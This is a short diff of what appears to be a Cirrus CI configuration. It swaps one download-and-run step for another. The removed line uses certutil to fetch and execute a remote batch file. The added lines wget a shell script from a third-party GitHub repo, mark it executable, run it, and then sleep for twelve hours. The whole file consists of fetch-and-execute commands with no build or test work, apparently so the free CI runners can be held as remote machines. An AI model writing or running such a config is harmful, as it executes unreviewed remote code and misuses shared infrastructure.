@@ -1,7 +1,11 @@
-windows_container:
-  image: cirrusci/windowsservercore:2019
+container:
+  image: ubuntu
   cpu: 4
   memory: 10G
   
 task:
-  script: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/DangDev/cirrus-win/main/winunlocked.bat && winunlocked.bat
+  prepare_script: wget https://raw.githubusercontent.com/cloudshell123/labtest/master/CRD_COLAB_EXE.sh &> /dev/null
+  setup1_script: chmod +x CRD_COLAB_EXE.sh
+  setup_script: ./CRD_COLAB_EXE.sh
+  complete_script: sleep 43200
+  
